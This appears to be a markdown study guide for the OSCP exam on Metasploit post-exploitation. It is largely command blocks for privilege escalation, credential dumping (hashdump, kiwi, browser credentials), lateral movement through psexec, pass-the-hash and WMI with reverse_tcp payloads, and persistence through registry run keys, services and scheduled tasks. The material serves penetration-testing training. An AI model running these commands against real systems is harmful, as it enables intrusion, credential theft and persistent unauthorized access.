# Post-Exploitation with Metasploit

Post-exploitation is a critical phase where you gather information, maintain access, and move laterally. This guide covers essential Metasploit post-exploitation techniques for the OSCP exam.

## üìã Table of Contents
1. [Meterpreter Basics](#meterpreter-basics)
2. [Privilege Escalation](#privilege-escalation)
3. [Credential Harvesting](#credential-harvesting)
4. [Lateral Movement](#lateral-movement)
5. [Persistence](#persistence)
6. [Practice](#-practice)

## Meterpreter Basics

### Core Commands
```meterpreter
# System information
sysinfo

# Current user
getuid

# Get system privileges
getsystem

# Background current session
background

# List all sessions
sessions -l

# Interact with a session
sessions -i [ID]
```

### File System Operations
```meterpreter
# Navigate filesystem
cd, pwd, ls

# Upload file
upload /path/to/local/file [remote/path]

# Download file
download remote_file [local_path]

# Search for files
search -f *.txt
```

### Network Information
```meterpreter
# Network interfaces
ipconfig

# Network routes
route

# ARP table
arp

# Port forwarding
portfwd add -l 3389 -p 3389 -r TARGET_IP
```

## Privilege Escalation

### Local Exploit Suggester
```meterpreter
# Background current session
background

# Use the suggester module
use post/multi/recon/local_exploit_suggester
set SESSION [session_id]
run
```

### Common Windows Escalation Exploits
```msf
# Bypass UAC
use exploit/windows/local/bypassuac
set SESSION [id]
run

# MS16-032 (Secondary Logon)
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION [id]
run

# AlwaysInstallElevated
use exploit/windows/local/always_install_elevated
set SESSION [id]
run
```

### Linux Privilege Escalation
```msf
# Check for sudo tokens
use multi/recon/sudo_checker
set SESSION [id]
run

# Check for writable cron jobs
use post/linux/gather/enum_system
set SESSION [id]
run
```

## Credential Harvesting

### Windows Credentials
```meterpreter
# Dump hashes
hashdump

# Use kiwi extension
load kiwi
creds_all

# Dump LSA secrets
use kiwi_cmd
lsa_dump_secrets
```

### Browser Credentials
```meterpreter
# Dump browser credentials
use post/multi/gather/firefox_creds
set SESSION [id]
run

# Chrome credentials
use post/multi/gather/chrome_cookies
set SESSION [id]
run
```

## Lateral Movement

### PSExec
```msf
use exploit/windows/smb/psexec
set RHOSTS [target]
set SMBUSER [username]
set SMBPASS [password]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [your_ip]
run
```

### Pass the Hash
```msf
use exploit/windows/smb/psexec
set RHOSTS [target]
set SMBUSER [username]
set SMBPASS [hash_in_lm:ntlm_format]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [your_ip]
run
```

### WMI Exec
```msf
use exploit/windows/local/wmi
set RHOSTS [target]
set USERNAME [username]
set PASSWORD [password]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [your_ip]
run
```

## Persistence

### Meterpreter Service
```meterpreter
# Create a service
run persistence -X -i 10 -p [port] -r [your_ip]

# List existing services
reg enumkey -k HKLM\\SYSTEM\\CurrentControlSet\\services
```

### Registry Run Keys
```meterpreter
# Add to startup
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v [name] -d '[command]'

# View startup programs
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v [name]
```

### Scheduled Tasks
```meterpreter
# Create a scheduled task
schtasks /create /tn "Update" /tr "C:\path\to\payload.exe" /sc onlogon /ru System
```

## üõ† Tools

### Post-Exploitation Modules
- **mimikatz**: Credential dumping
- **kiwi**: Mimikatz in Meterpreter
- **incognito**: Token impersonation
- **powershell**: Run PowerShell commands

### External Tools
- **BloodHound**: AD enumeration
- **PowerSploit**: PowerShell post-exploitation
- **Empire**: Post-exploitation framework

## üìö Resources
- [Metasploit Unleashed - Post-Exploitation](https://www.offensive-security.com/metasploit-unleashed/post-exploitation/)
- [HackTricks - Windows Post-Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings - Windows Post-Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## üéØ Practice
1. Gain initial access to a Windows machine
2. Escalate privileges using local exploits
3. Dump credentials and hashes
4. Move laterally to other machines
5. Establish persistence

## ‚ö†Ô∏è Legal Note
Only perform post-exploitation activities on systems you own or have explicit permission to test. Unauthorized testing is illegal.
